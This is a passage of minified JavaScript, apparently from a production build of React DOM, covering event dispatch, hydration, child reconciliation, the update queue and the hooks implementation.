C(d,u+"enter",w,n,g),C.target=p,C.relatedTarget=O,y=C),O=y,k&&w)t:{for(C=k,d=w,u=0,p=C;p;p=Nt(p))u++;for(p=0,y=d;y;y=Nt(y))p++;for(;0<u-p;)C=Nt(C),u--;for(;0<p-u;)d=Nt(d),p--;for(;u--;){if(C===d||d!==null&&C===d.alternate)break t;C=Nt(C),d=Nt(d)}C=null}else C=null;k!==null&&pi(f,h,k,C,!1),w!==null&&O!==null&&pi(f,O,w,C,!0)}}e:{if(h=c?Ht(c):window,k=h.nodeName&&h.nodeName.toLowerCase(),k==="select"||k==="input"&&h.type==="file")var x=Fd;else if(li(h))if(Va)x=Wd;else{x=Hd;var v=zd}else(k=h.nodeName)&&k.toLowerCase()==="input"&&(h.type==="checkbox"||h.type==="radio")&&(x=Ud);if(x&&(x=x(e,c))){Ba(f,x,n,g);break e}v&&v(e,h,c),e==="focusout"&&(v=h._wrapperState)&&v.controlled&&h.type==="number"&&rl(h,"number",h.value)}switch(v=c?Ht(c):window,e){case"focusin":(li(v)||v.contentEditable==="true")&&(Ft=v,hl=c,Rn=null);break;case"focusout":Rn=hl=Ft=null;break;case"mousedown":gl=!0;break;case"contextmenu":case"mouseup":case"dragend":gl=!1,ci(f,n,g);break;case"selectionchange":if(Jd)break;case"keydown":case"keyup":ci(f,n,g)}var E;if(is)e:{switch(e){case"compositionstart":var j="onCompositionStart";break e;case"compositionend":j="onCompositionEnd";break e;case"compositionupdate":j="onCompositionUpdate";break e}j=void 0}else _t?Ua(e,n)&&(j="onCompositionEnd"):e==="keydown"&&n.keyCode===229&&(j="onCompositionStart");j&&(Ha&&n.locale!=="ko"&&(_t||j!=="onCompositionStart"?j==="onCompositionEnd"&&_t&&(E=za()):(nt=g,os="value"in nt?nt.value:nt.textContent,_t=!0)),v=zr(c,j),0<v.length&&(j=new ti(j,e,null,n,g),f.push({event:j,listeners:v}),E?j.data=E:(E=Wa(n),E!==null&&(j.data=E)))),(E=Nd?Od(e,n):Ad(e,n))&&(c=zr(c,"onBeforeInput"),0<c.length&&(g=new ti("onBeforeInput","beforeinput",null,n,g),f.push({event:g,listeners:c}),g.data=E))}eu(f,t)})}function Wn(e,t,n){return{instance:e,listener:t,currentTarget:n}}function zr(e,t){for(var n=t+"Capture",r=[];e!==null;){var o=e,l=o.stateNode;o.tag===5&&l!==null&&(o=l,l=An(e,n),l!=null&&r.unshift(Wn(e,l,o)),l=An(e,t),l!=null&&r.push(Wn(e,l,o))),e=e.return}return r}function Nt(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5);return e||null}function pi(e,t,n,r,o){for(var l=t._reactName,s=[];n!==null&&n!==r;){var i=n,a=i.alternate,c=i.stateNode;if(a!==null&&a===r)break;i.tag===5&&c!==null&&(i=c,o?(a=An(n,l),a!=null&&s.unshift(Wn(n,a,i))):o||(a=An(n,l),a!=null&&s.push(Wn(n,a,i)))),n=n.return}s.length!==0&&e.push({event:t,listeners:s})}var Qd=/\r\n?/g,Xd=/\u0000|\uFFFD/g;function mi(e){return(typeof e=="string"?e:""+e).replace(Qd,`
`).replace(Xd,"")}function pr(e,t,n){if(t=mi(t),mi(e)!==t&&n)throw Error(S(425))}function Hr(){}var vl=null,yl=null;function Sl(e,t){return e==="textarea"||e==="noscript"||typeof t.children=="string"||typeof t.children=="number"||typeof t.dangerouslySetInnerHTML=="object"&&t.dangerouslySetInnerHTML!==null&&t.dangerouslySetInnerHTML.__html!=null}var wl=typeof setTimeout=="function"?setTimeout:void 0,Yd=typeof clearTimeout=="function"?clearTimeout:void 0,hi=typeof Promise=="function"?Promise:void 0,qd=typeof queueMicrotask=="function"?queueMicrotask:typeof hi<"u"?function(e){return hi.resolve(null).then(e).catch(Zd)}:wl;function Zd(e){setTimeout(function(){throw e})}function zo(e,t){var n=t,r=0;do{var o=n.nextSibling;if(e.removeChild(n),o&&o.nodeType===8)if(n=o.data,n==="/$"){if(r===0){e.removeChild(o),Fn(t);return}r--}else n!=="$"&&n!=="$?"&&n!=="$!"||r++;n=o}while(n);Fn(t)}function it(e){for(;e!=null;e=e.nextSibling){var t=e.nodeType;if(t===1||t===3)break;if(t===8){if(t=e.data,t==="$"||t==="$!"||t==="$?")break;if(t==="/$")return null}}return e}function gi(e){e=e.previousSibling;for(var t=0;e;){if(e.nodeType===8){var n=e.data;if(n==="$"||n==="$!"||n==="$?"){if(t===0)return e;t--}else n==="/$"&&t++}e=e.previousSibling}return null}var un=Math.random().toString(36).slice(2),_e="__reactFiber$"+un,Bn="__reactProps$"+un,Ge="__reactContainer$"+un,kl="__reactEvents$"+un,ef="__reactListeners$"+un,tf="__reactHandles$"+un;function kt(e){var t=e[_e];if(t)return t;for(var n=e.parentNode;n;){if(t=n[Ge]||n[_e]){if(n=t.alternate,t.child!==null||n!==null&&n.child!==null)for(e=gi(e);e!==null;){if(n=e[_e])return n;e=gi(e)}return t}e=n,n=e.parentNode}return null}function Zn(e){return e=e[_e]||e[Ge],!e||e.tag!==5&&e.tag!==6&&e.tag!==13&&e.tag!==3?null:e}function Ht(e){if(e.tag===5||e.tag===6)return e.stateNode;throw Error(S(33))}function ao(e){return e[Bn]||null}var Cl=[],Ut=-1;function ht(e){return{current:e}}function _(e){0>Ut||(e.current=Cl[Ut],Cl[Ut]=null,Ut--)}function A(e,t){Ut++,Cl[Ut]=e.current,e.current=t}var pt={},le=ht(pt),fe=ht(!1),Pt=pt;function en(e,t){var n=e.type.contextTypes;if(!n)return pt;var r=e.stateNode;if(r&&r.__reactInternalMemoizedUnmaskedChildContext===t)return r.__reactInternalMemoizedMaskedChildContext;var o={},l;for(l in n)o[l]=t[l];return r&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=t,e.__reactInternalMemoizedMaskedChildContext=o),o}function pe(e){return e=e.childContextTypes,e!=null}function Ur(){_(fe),_(le)}function vi(e,t,n){if(le.current!==pt)throw Error(S(168));A(le,t),A(fe,n)}function nu(e,t,n){var r=e.stateNode;if(t=t.childContextTypes,typeof r.getChildContext!="function")return n;r=r.getChildContext();for(var o in r)if(!(o in t))throw Error(S(108,zc(e)||"Unknown",o));return U({},n,r)}function Wr(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||pt,Pt=le.current,A(le,e),A(fe,fe.current),!0}function yi(e,t,n){var r=e.stateNode;if(!r)throw Error(S(169));n?(e=nu(e,t,Pt),r.__reactInternalMemoizedMergedChildContext=e,_(fe),_(le),A(le,e)):_(fe),A(fe,n)}var Ue=null,uo=!1,Ho=!1;function ru(e){Ue===null?Ue=[e]:Ue.push(e)}function nf(e){uo=!0,ru(e)}function gt(){if(!Ho&&Ue!==null){Ho=!0;var e=0,t=N;try{var n=Ue;for(N=1;e<n.length;e++){var r=n[e];do r=r(!0);while(r!==null)}Ue=null,uo=!1}catch(o){throw Ue!==null&&(Ue=Ue.slice(e+1)),Ra(es,gt),o}finally{N=t,Ho=!1}}return null}var Wt=[],Bt=0,Br=null,Vr=0,ke=[],Ce=0,jt=null,We=1,Be="";function St(e,t){Wt[Bt++]=Vr,Wt[Bt++]=Br,Br=e,Vr=t}function ou(e,t,n){ke[Ce++]=We,ke[Ce++]=Be,ke[Ce++]=jt,jt=e;var r=We;e=Be;var o=32-Le(r)-1;r&=~(1<<o),n+=1;var l=32-Le(t)+o;if(30<l){var s=o-o%5;l=(r&(1<<s)-1).toString(32),r>>=s,o-=s,We=1<<32-Le(t)+o|n<<o|r,Be=l+e}else We=1<<l|n<<o|r,Be=e}function us(e){e.return!==null&&(St(e,1),ou(e,1,0))}function cs(e){for(;e===Br;)Br=Wt[--Bt],Wt[Bt]=null,Vr=Wt[--Bt],Wt[Bt]=null;for(;e===jt;)jt=ke[--Ce],ke[Ce]=null,Be=ke[--Ce],ke[Ce]=null,We=ke[--Ce],ke[Ce]=null}var ve=null,ge=null,F=!1,De=null;function lu(e,t){var n=xe(5,null,null,0);n.elementType="DELETED",n.stateNode=t,n.return=e,t=e.deletions,t===null?(e.deletions=[n],e.flags|=16):t.push(n)}function Si(e,t){switch(e.tag){case 5:var n=e.type;return t=t.nodeType!==1||n.toLowerCase()!==t.nodeName.toLowerCase()?null:t,t!==null?(e.stateNode=t,ve=e,ge=it(t.firstChild),!0):!1;case 6:return t=e.pendingProps===""||t.nodeType!==3?null:t,t!==null?(e.stateNode=t,ve=e,ge=null,!0):!1;case 13:return t=t.nodeType!==8?null:t,t!==null?(n=jt!==null?{id:We,overflow:Be}:null,e.memoizedState={dehydrated:t,treeContext:n,retryLane:1073741824},n=xe(18,null,null,0),n.stateNode=t,n.return=e,e.child=n,ve=e,ge=null,!0):!1;default:return!1}}function xl(e){return(e.mode&1)!==0&&(e.flags&128)===0}function Tl(e){if(F){var t=ge;if(t){var n=t;if(!Si(e,t)){if(xl(e))throw Error(S(418));t=it(n.nextSibling);var r=ve;t&&Si(e,t)?lu(r,n):(e.flags=e.flags&-4097|2,F=!1,ve=e)}}else{if(xl(e))throw Error(S(418));e.flags=e.flags&-4097|2,F=!1,ve=e}}}function wi(e){for(e=e.return;e!==null&&e.tag!==5&&e.tag!==3&&e.tag!==13;)e=e.return;ve=e}function mr(e){if(e!==ve)return!1;if(!F)return wi(e),F=!0,!1;var t;if((t=e.tag!==3)&&!(t=e.tag!==5)&&(t=e.type,t=t!=="head"&&t!=="body"&&!Sl(e.type,e.memoizedProps)),t&&(t=ge)){if(xl(e))throw su(),Error(S(418));for(;t;)lu(e,t),t=it(t.nextSibling)}if(wi(e),e.tag===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(S(317));e:{for(e=e.nextSibling,t=0;e;){if(e.nodeType===8){var n=e.data;if(n==="/$"){if(t===0){ge=it(e.nextSibling);break e}t--}else n!=="$"&&n!=="$!"&&n!=="$?"||t++}e=e.nextSibling}ge=null}}else ge=ve?it(e.stateNode.nextSibling):null;return!0}function su(){for(var e=ge;e;)e=it(e.nextSibling)}function tn(){ge=ve=null,F=!1}function ds(e){De===null?De=[e]:De.push(e)}var rf=Qe.ReactCurrentBatchConfig;function vn(e,t,n){if(e=n.ref,e!==null&&typeof e!="function"&&typeof e!="object"){if(n._owner){if(n=n._owner,n){if(n.tag!==1)throw Error(S(309));var r=n.stateNode}if(!r)throw Error(S(147,e));var o=r,l=""+e;return t!==null&&t.ref!==null&&typeof t.ref=="function"&&t.ref._stringRef===l?t.ref:(t=function(s){var i=o.refs;s===null?delete i[l]:i[l]=s},t._stringRef=l,t)}if(typeof e!="string")throw Error(S(284));if(!n._owner)throw Error(S(290,e))}return e}function hr(e,t){throw e=Object.prototype.toString.call(t),Error(S(31,e==="[object Object]"?"object with keys {"+Object.keys(t).join(", ")+"}":e))}function ki(e){var t=e._init;return t(e._payload)}function iu(e){function t(d,u){if(e){var p=d.deletions;p===null?(d.deletions=[u],d.flags|=16):p.push(u)}}function n(d,u){if(!e)return null;for(;u!==null;)t(d,u),u=u.sibling;return null}function r(d,u){for(d=new Map;u!==null;)u.key!==null?d.set(u.key,u):d.set(u.index,u),u=u.sibling;return d}function o(d,u){return d=dt(d,u),d.index=0,d.sibling=null,d}function l(d,u,p){return d.index=p,e?(p=d.alternate,p!==null?(p=p.index,p<u?(d.flags|=2,u):p):(d.flags|=2,u)):(d.flags|=1048576,u)}function s(d){return e&&d.alternate===null&&(d.flags|=2),d}function i(d,u,p,y){return u===null||u.tag!==6?(u=$o(p,d.mode,y),u.return=d,u):(u=o(u,p),u.return=d,u)}function a(d,u,p,y){var x=p.type;return x===It?g(d,u,p.props.children,y,p.key):u!==null&&(u.elementType===x||typeof x=="object"&&x!==null&&x.$$typeof===qe&&ki(x)===u.type)?(y=o(u,p.props),y.ref=vn(d,u,p),y.return=d,y):(y=Dr(p.type,p.key,p.props,null,d.mode,y),y.ref=vn(d,u,p),y.return=d,y)}function c(d,u,p,y){return u===null||u.tag!==4||u.stateNode.containerInfo!==p.containerInfo||u.stateNode.implementation!==p.implementation?(u=Ko(p,d.mode,y),u.return=d,u):(u=o(u,p.children||[]),u.return=d,u)}function g(d,u,p,y,x){return u===null||u.tag!==7?(u=Et(p,d.mode,y,x),u.return=d,u):(u=o(u,p),u.return=d,u)}function f(d,u,p){if(typeof u=="string"&&u!==""||typeof u=="number")return u=$o(""+u,d.mode,p),u.return=d,u;if(typeof u=="object"&&u!==null){switch(u.$$typeof){case or:return p=Dr(u.type,u.key,u.props,null,d.mode,p),p.ref=vn(d,null,u),p.return=d,p;case At:return u=Ko(u,d.mode,p),u.return=d,u;case qe:var y=u._init;return f(d,y(u._payload),p)}if(kn(u)||fn(u))return u=Et(u,d.mode,p,null),u.return=d,u;hr(d,u)}return null}function h(d,u,p,y){var x=u!==null?u.key:null;if(typeof p=="string"&&p!==""||typeof p=="number")return x!==null?null:i(d,u,""+p,y);if(typeof p=="object"&&p!==null){switch(p.$$typeof){case or:return p.key===x?a(d,u,p,y):null;case At:return p.key===x?c(d,u,p,y):null;case qe:return x=p._init,h(d,u,x(p._payload),y)}if(kn(p)||fn(p))return x!==null?null:g(d,u,p,y,null);hr(d,p)}return null}function k(d,u,p,y,x){if(typeof y=="string"&&y!==""||typeof y=="number")return d=d.get(p)||null,i(u,d,""+y,x);if(typeof y=="object"&&y!==null){switch(y.$$typeof){case or:return d=d.get(y.key===null?p:y.key)||null,a(u,d,y,x);case At:return d=d.get(y.key===null?p:y.key)||null,c(u,d,y,x);case qe:var v=y._init;return k(d,u,p,v(y._payload),x)}if(kn(y)||fn(y))return d=d.get(p)||null,g(u,d,y,x,null);hr(u,y)}return null}function w(d,u,p,y){for(var x=null,v=null,E=u,j=u=0,B=null;E!==null&&j<p.length;j++){E.index>j?(B=E,E=null):B=E.sibling;var D=h(d,E,p[j],y);if(D===null){E===null&&(E=B);break}e&&E&&D.alternate===null&&t(d,E),u=l(D,u,j),v===null?x=D:v.sibling=D,v=D,E=B}if(j===p.length)return n(d,E),F&&St(d,j),x;if(E===null){for(;j<p.length;j++)E=f(d,p[j],y),E!==null&&(u=l(E,u,j),v===null?x=E:v.sibling=E,v=E);return F&&St(d,j),x}for(E=r(d,E);j<p.length;j++)B=k(E,d,j,p[j],y),B!==null&&(e&&B.alternate!==null&&E.delete(B.key===null?j:B.key),u=l(B,u,j),v===null?x=B:v.sibling=B,v=B);return e&&E.forEach(function(je){return t(d,je)}),F&&St(d,j),x}function C(d,u,p,y){var x=fn(p);if(typeof x!="function")throw Error(S(150));if(p=x.call(p),p==null)throw Error(S(151));for(var v=x=null,E=u,j=u=0,B=null,D=p.next();E!==null&&!D.done;j++,D=p.next()){E.index>j?(B=E,E=null):B=E.sibling;var je=h(d,E,D.value,y);if(je===null){E===null&&(E=B);break}e&&E&&je.alternate===null&&t(d,E),u=l(je,u,j),v===null?x=je:v.sibling=je,v=je,E=B}if(D.done)return n(d,E),F&&St(d,j),x;if(E===null){for(;!D.done;j++,D=p.next())D=f(d,D.value,y),D!==null&&(u=l(D,u,j),v===null?x=D:v.sibling=D,v=D);return F&&St(d,j),x}for(E=r(d,E);!D.done;j++,D=p.next())D=k(E,d,j,D.value,y),D!==null&&(e&&D.alternate!==null&&E.delete(D.key===null?j:D.key),u=l(D,u,j),v===null?x=D:v.sibling=D,v=D);return e&&E.forEach(function(cn){return t(d,cn)}),F&&St(d,j),x}function O(d,u,p,y){if(typeof p=="object"&&p!==null&&p.type===It&&p.key===null&&(p=p.props.children),typeof p=="object"&&p!==null){switch(p.$$typeof){case or:e:{for(var x=p.key,v=u;v!==null;){if(v.key===x){if(x=p.type,x===It){if(v.tag===7){n(d,v.sibling),u=o(v,p.props.children),u.return=d,d=u;break e}}else if(v.elementType===x||typeof x=="object"&&x!==null&&x.$$typeof===qe&&ki(x)===v.type){n(d,v.sibling),u=o(v,p.props),u.ref=vn(d,v,p),u.return=d,d=u;break e}n(d,v);break}else t(d,v);v=v.sibling}p.type===It?(u=Et(p.props.children,d.mode,y,p.key),u.return=d,d=u):(y=Dr(p.type,p.key,p.props,null,d.mode,y),y.ref=vn(d,u,p),y.return=d,d=y)}return s(d);case At:e:{for(v=p.key;u!==null;){if(u.key===v)if(u.tag===4&&u.stateNode.containerInfo===p.containerInfo&&u.stateNode.implementation===p.implementation){n(d,u.sibling),u=o(u,p.children||[]),u.return=d,d=u;break e}else{n(d,u);break}else t(d,u);u=u.sibling}u=Ko(p,d.mode,y),u.return=d,d=u}return s(d);case qe:return v=p._init,O(d,u,v(p._payload),y)}if(kn(p))return w(d,u,p,y);if(fn(p))return C(d,u,p,y);hr(d,p)}return typeof p=="string"&&p!==""||typeof p=="number"?(p=""+p,u!==null&&u.tag===6?(n(d,u.sibling),u=o(u,p),u.return=d,d=u):(n(d,u),u=$o(p,d.mode,y),u.return=d,d=u),s(d)):n(d,u)}return O}var nn=iu(!0),au=iu(!1),Jr=ht(null),Gr=null,Vt=null,fs=null;function ps(){fs=Vt=Gr=null}function ms(e){var t=Jr.current;_(Jr),e._currentValue=t}function El(e,t,n){for(;e!==null;){var r=e.alternate;if((e.childLanes&t)!==t?(e.childLanes|=t,r!==null&&(r.childLanes|=t)):r!==null&&(r.childLanes&t)!==t&&(r.childLanes|=t),e===n)break;e=e.return}}function Yt(e,t){Gr=e,fs=Vt=null,e=e.dependencies,e!==null&&e.firstContext!==null&&(e.lanes&t&&(de=!0),e.firstContext=null)}function Ee(e){var t=e._currentValue;if(fs!==e)if(e={context:e,memoizedValue:t,next:null},Vt===null){if(Gr===null)throw Error(S(308));Vt=e,Gr.dependencies={lanes:0,firstContext:e}}else Vt=Vt.next=e;return t}var Ct=null;function hs(e){Ct===null?Ct=[e]:Ct.push(e)}function uu(e,t,n,r){var o=t.interleaved;return o===null?(n.next=n,hs(t)):(n.next=o.next,o.next=n),t.interleaved=n,$e(e,r)}function $e(e,t){e.lanes|=t;var n=e.alternate;for(n!==null&&(n.lanes|=t),n=e,e=e.return;e!==null;)e.childLanes|=t,n=e.alternate,n!==null&&(n.childLanes|=t),n=e,e=e.return;return n.tag===3?n.stateNode:null}var Ze=!1;function gs(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function cu(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function Ve(e,t){return{eventTime:e,lane:t,tag:0,payload:null,callback:null,next:null}}function at(e,t,n){var r=e.updateQueue;if(r===null)return null;if(r=r.shared,L&2){var o=r.pending;return o===null?t.next=t:(t.next=o.next,o.next=t),r.pending=t,$e(e,n)}return o=r.interleaved,o===null?(t.next=t,hs(r)):(t.next=o.next,o.next=t),r.interleaved=t,$e(e,n)}function Er(e,t,n){if(t=t.updateQueue,t!==null&&(t=t.shared,(n&4194240)!==0)){var r=t.lanes;r&=e.pendingLanes,n|=r,t.lanes=n,ts(e,n)}}function Ci(e,t){var n=e.updateQueue,r=e.alternate;if(r!==null&&(r=r.updateQueue,n===r)){var o=null,l=null;if(n=n.firstBaseUpdate,n!==null){do{var s={eventTime:n.eventTime,lane:n.lane,tag:n.tag,payload:n.payload,callback:n.callback,next:null};l===null?o=l=s:l=l.next=s,n=n.next}while(n!==null);l===null?o=l=t:l=l.next=t}else o=l=t;n={baseState:r.baseState,firstBaseUpdate:o,lastBaseUpdate:l,shared:r.shared,effects:r.effects},e.updateQueue=n;return}e=n.lastBaseUpdate,e===null?n.firstBaseUpdate=t:e.next=t,n.lastBaseUpdate=t}function $r(e,t,n,r){var o=e.updateQueue;Ze=!1;var l=o.firstBaseUpdate,s=o.lastBaseUpdate,i=o.shared.pending;if(i!==null){o.shared.pending=null;var a=i,c=a.next;a.next=null,s===null?l=c:s.next=c,s=a;var g=e.alternate;g!==null&&(g=g.updateQueue,i=g.lastBaseUpdate,i!==s&&(i===null?g.firstBaseUpdate=c:i.next=c,g.lastBaseUpdate=a))}if(l!==null){var f=o.baseState;s=0,g=c=a=null,i=l;do{var h=i.lane,k=i.eventTime;if((r&h)===h){g!==null&&(g=g.next={eventTime:k,lane:0,tag:i.tag,payload:i.payload,callback:i.callback,next:null});e:{var w=e,C=i;switch(h=t,k=n,C.tag){case 1:if(w=C.payload,typeof w=="function"){f=w.call(k,f,h);break e}f=w;break e;case 3:w.flags=w.flags&-65537|128;case 0:if(w=C.payload,h=typeof w=="function"?w.call(k,f,h):w,h==null)break e;f=U({},f,h);break e;case 2:Ze=!0}}i.callback!==null&&i.lane!==0&&(e.flags|=64,h=o.effects,h===null?o.effects=[i]:h.push(i))}else k={eventTime:k,lane:h,tag:i.tag,payload:i.payload,callback:i.callback,next:null},g===null?(c=g=k,a=f):g=g.next=k,s|=h;if(i=i.next,i===null){if(i=o.shared.pending,i===null)break;h=i,i=h.next,h.next=null,o.lastBaseUpdate=h,o.shared.pending=null}}while(!0);if(g===null&&(a=f),o.baseState=a,o.firstBaseUpdate=c,o.lastBaseUpdate=g,t=o.shared.interleaved,t!==null){o=t;do s|=o.lane,o=o.next;while(o!==t)}else l===null&&(o.shared.lanes=0);Mt|=s,e.lanes=s,e.memoizedState=f}}function xi(e,t,n){if(e=t.effects,t.effects=null,e!==null)for(t=0;t<e.length;t++){var r=e[t],o=r.callback;if(o!==null){if(r.callback=null,r=n,typeof o!="function")throw Error(S(191,o));o.call(r)}}}var er={},ze=ht(er),Vn=ht(er),Jn=ht(er);function xt(e){if(e===er)throw Error(S(174));return e}function vs(e,t){switch(A(Jn,t),A(Vn,e),A(ze,er),e=t.nodeType,e){case 9:case 11:t=(t=t.documentElement)?t.namespaceURI:ll(null,"");break;default:e=e===8?t.parentNode:t,t=e.namespaceURI||null,e=e.tagName,t=ll(t,e)}_(ze),A(ze,t)}function rn(){_(ze),_(Vn),_(Jn)}function du(e){xt(Jn.current);var t=xt(ze.current),n=ll(t,e.type);t!==n&&(A(Vn,e),A(ze,n))}function ys(e){Vn.current===e&&(_(ze),_(Vn))}var z=ht(0);function Kr(e){for(var t=e;t!==null;){if(t.tag===13){var n=t.memoizedState;if(n!==null&&(n=n.dehydrated,n===null||n.data==="$?"||n.data==="$!"))return t}else if(t.tag===19&&t.memoizedProps.revealOrder!==void 0){if(t.flags&128)return t}else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}var Uo=[];function Ss(){for(var e=0;e<Uo.length;e++)Uo[e]._workInProgressVersionPrimary=null;Uo.length=0}var Pr=Qe.ReactCurrentDispatcher,Wo=Qe.ReactCurrentBatchConfig,Rt=0,H=null,K=null,Y=null,Qr=!1,Mn=!1,Gn=0,of=0;function ne(){throw Error(S(321))}function ws(e,t){if(t===null)return!1;for(var n=0;n<t.length&&n<e.length;n++)if(!Oe(e[n],t[n]))return!1;return!0}function ks(e,t,n,r,o,l){if(Rt=l,H=t,t.memoizedState=null,t.updateQueue=null,t.lanes=0,Pr.current=e===null||e.memoizedState===null?uf:cf,e=n(r,o),Mn){l=0;do{if(Mn=!1,Gn=0,25<=l)throw Error(S(301));l+=1,Y=K=null,t.updateQueue=null,Pr.current=df,e=n(r,o)}while(Mn)}if(Pr.current=Xr,t=K!==null&&K.next!==null,Rt=0,Y=K=H=null,Qr=!1,t)throw Error(S(300));return e}function Cs(){var e=Gn!==0;return Gn=0,e}function Ie(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return Y===null?H.memoizedState=Y=e:Y=Y.next=e,Y}function Pe(){if(K===null){var e=H.alternate;e=e!==null?e.memoizedState:null}else e=K.next;var t=Y===null?H.memoizedState:Y.next;if(t!==null)Y=t,K=e;else{if(e===null)throw Error(S(310));K=e,e={memoizedState:K.memoizedState,baseState:K.baseState,baseQueue:K.baseQueue,queue:K.queue,next:null},Y===null?H.memoizedState=Y=e:Y=Y.next=e}return Y}function $n(e,t){return typeof t=="function"?t(e):t}function Bo(e){var t=Pe(),n=t.queue;if(n===null)throw Error(S(311));n.lastRenderedReducer=e;var r=K,o=r.baseQueue,l=n.pending;if(l!==null){if(o!==null){var s=o.next;o.next=l.next,l.next=s}r.baseQueue=o=l,n.pending=null}if(o!==null){l=o.next,r=r.baseState;var i=s=null,a=null,c=l;do{var g=c.lane;if((Rt&g)===g)a!==null&&(a=a.next={lane:0,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null}),r=c.hasEagerState?c.eagerState:e(r,c.action);else{var f={lane:g,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null};a===null?(i=a=f,s=r):a=a.next=f,H.lanes|=g,Mt|=g}c=c.next}while(c!==null&&c!==l);a===null?s=r:a.next=i,Oe(r,t.memoizedState)||(de=!0),t.memoizedState=r,t.baseState=s,t.baseQueue=a,n.lastRenderedState=r}if(e=n.interleaved,e!==null){o=e;do l=o.lane,H.lanes|=l,Mt|=l,o=o.next;while(o!==e)}else o===null&&(n.lanes=0);return[t.memoizedState,n.dispatch]}function Vo(e){var t=Pe(),n=t.queue;if(n===null)throw Error(S(311));n.lastRenderedReducer=e;var r=n.dispatch,o=n.pending,l=t.memoizedState;if(o!==null){n.pending=null;var s=o=o.next;do l=e(l,s.action),s=s.next;while(s!==o);Oe(l,t.memoizedState)||(de=!0),t.memoizedState=l,t.baseQueue===null&&(t.baseState=l),n.lastRenderedState=l}return[l,r]}function fu(){}function pu(e,t){var n=H,r=Pe(),o=t(),l=!Oe(r.memoizedState,o);if(l&&(r.memoizedState=o,de=!0),r=r.queue,xs(gu.bind(null,n,r,e),[e]),r.getSnapshot!==t||l||Y!==null&&Y.memoizedState.tag&1){if(n.flags|=2048,Kn(9,hu.bind(null,n,r,o,t),void 0,null),q===null)throw Error(S(349));Rt&30||mu(n,t,o)}return o}function mu(e,t,n){e.flags|=16384,e={getSnapshot:t,value:n},t=H.updateQueue,t===null?(t={lastEffect:null,stores:null},H.updateQueue=t,t.stores=[e]):(n=t.stores,n===null?t.stores=[e]:n.push(e))}function hu(e,t,n,r){t.value=n,t.getSnapshot=r,vu(t)&&yu(e)}function gu(e,t,n){return n(function(){vu(t)&&yu(e)})}function vu(e){var t=e.getSnapshot;e=e.value;try{var n=t();return!Oe(e,n)}catch{return!0}}function yu(e){var t=$e(e,1);t!==null&&Ne(t,e,1,-1)}function Ti(e){var t=Ie();return typeof e=="function"&&(e=e()),t.memoizedState=t.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:$n,lastRenderedState:e},t.queue=e,e=e.dispatch=af.bind(null,H,e),[t.memoizedState,e]}function Kn(e,t,n,r){return e={tag:e,create:t,destroy:n,deps:r,next:null},t=H.updateQueue,t===null?(t={lastEffect:null,stores:null},H.updateQueue=t,t.lastEffect=e.next=e):(n=t.lastEffect,n===null?t.lastEffect=e.next=e:(r=n.next,n.next=e,e.next=r,t.lastEffect=e)),e}function Su(){return Pe().memoizedState}function jr(e,t,n,r){var o=Ie();H.flags|=e,o.memoizedState=Kn(1|t,n,void 0,r===void 0?null:r)}function co(e,t,n,r){var o=Pe();r=r===void 0?null:r;var l=void 0;if(K!==null){var s=K.memoizedState;if(l=s.destroy,r!==null&&ws(r,s.deps)){o.memoizedState=Kn(t,n,l,r);return}}H.flags|=e,o.memoizedState=Kn(1|t,n,l,r)}function Ei(e,t){return jr(8390656,8,e,t)}function xs(e,t){return co(2048,8,e,t)}function wu(e,t){return co(4,2,e,t)}function ku(e,t){return co(4,4,e,t)}function Cu(e,t){if(typeof t=="function")return e=e(),t(e),function(){t(null)};if(t!=null)return e=e(),t.current=e,function(){t.current=null}}function xu(e,t,n){return n=n!=null?n.concat([e]):null,co(4,4,Cu.bind(null,t,e),n)}function Ts(){}function Tu(e,t){var n=Pe();t=t===void 0?null:t;var r=n.memoizedState;return r!==null&&t!==null&&ws(t,r[1])?r[0]:(n.memoizedState=[e,t],e)}function Eu(e,t){var n=Pe();t=t===void 0?null:t;var r=n.memoizedState;return r!==null&&t!==null&&ws(t,r[1])?r[0]:(e=e(),n.memoizedState=[e,t],e)}function Pu(e,t,n){return Rt&21?(Oe(n,t)||(n=Da(),H.lanes|=n,Mt|=n,e.baseState=!0),t):(e.baseState&&(e.baseState=!1,de=!0),e.memoizedState=n)}function lf(e,t){var n=N;N=n!==0&&4>n?n:4,e(!0);var r=Wo.transition;Wo.transition={};try{e(!1),t()}finally{N=n,Wo.transition=r}}function ju(){return Pe().memoizedState}function sf(e,t,n){var r=ct(e);if(n={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null},Ru(e))Mu(t,n);else if(n=uu(e,t,n,r),n!==null){var o=ie();Ne(n,e,r,o),bu(n,t,r)}}function af(e,t,n){var r=ct(e),o={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null};if(Ru(e))Mu(t,o);else{var l=e.alternate;if(e.lanes===0&&(l===null||l.lanes===0)&&(l=t.lastRenderedReducer,l!==null))try{var s=t.lastRenderedState,i=l(s,n);if(o.hasEagerState=!0,o.eagerState=i,Oe(i,s)){var a=t.interleaved;a===null?(o.next=o,hs(t)):(o.next=a.next,a.next=o),t.interleaved=o;return}}catch{}finally{}n=uu(e,t,o,r),n!==null&&(o=ie(),Ne(n,e,r,o),bu(n,t,r))}}function Ru(e){var t=e.alternate;return e===H||t!==null&&t===H}function Mu(e,t){Mn=Qr=!0;var n=e.pending;n===null?t.next=t:(t.next=n.next,n.next=t),e.pending=t}function bu(e,t,n){if(n&4194240){var r=t.lanes;r&=e.pendingLanes,n|=r,t.lanes=n,ts(e,n)}}var 